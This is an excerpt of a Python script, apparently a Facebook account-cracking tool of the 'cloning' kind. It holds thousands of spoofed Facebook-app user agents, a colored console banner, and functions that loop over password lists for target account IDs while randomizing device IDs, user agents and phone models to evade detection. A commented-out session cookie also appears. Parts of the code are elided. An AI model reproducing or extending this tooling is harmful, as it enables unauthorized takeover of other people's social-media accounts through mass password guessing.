...
for nt in range(10000):
    ...
    xx=f"Mozilla/5.0 (Linux; U; Android 4.2.1; pt-pt; bq Aquaris 5 Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/95.0.0.13.69;]"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Linux; U; Android 4.1.2; pt-pt; GT-S7390 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/106.0.0.26.68;]"
    ruz.append(xd)
...
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mVersion : \033[1;32m1.5
\033[1;37m===========================================""")
def linex():
	print('\033[1;37m===========================================')
def clear():
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/;FBAV/;FBBV/907136379;FBAN/FBAN;FBAV/;FBBV/907136379;FBDM//*{density=2.0,width=720,height=2560};FBLC/en_US;FBRV/808934450;FBCR/LG;FBMF/Apple;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G600;FBSV/11;FBOP/5;FBCA/arm64-v8a;FBSS/12;]"
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FB4A/;FBAV/A1XDL5U4;FBBV/947401591;FBAN/FB4A;FBAV/A1XDL5U4;FBBV/947401591;FBDM//*{density=1.5,width=720,height=4096};FBLC/de_DE;FBRV/599880519;FBCR/Realme;FBMF/Xiaomi;FBBD/G'Five;FBPN/com.facebook.katana;FBDV/LG_G9;FBSV/12;FBOP/4;FBCA/x86;FBSS/;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
    ...
    # 'cookie': 'datr=dFHPZRr63XpnhPxRNAE3ixrJ; sb=dFHPZbttDv9Ev80VlpBNVOPU; ps_l=0; ps_n=0; fr=0KBjrWPC0zaXocRwQ..Bl2Hpu..AAA.0.0.Bl2Hpu.AWV2aJHsQhE',
